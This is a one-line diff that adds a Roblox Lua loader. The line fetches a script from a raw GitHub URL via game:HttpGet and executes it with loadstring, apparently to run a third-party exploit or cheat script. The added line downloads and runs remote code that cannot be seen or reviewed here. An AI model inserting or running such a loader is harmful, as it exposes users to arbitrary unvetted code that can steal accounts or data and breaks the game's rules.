@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tamdz123-code/idk/refs/heads/main/script%20nh%C3%A0%20l%C3%A0m"))()
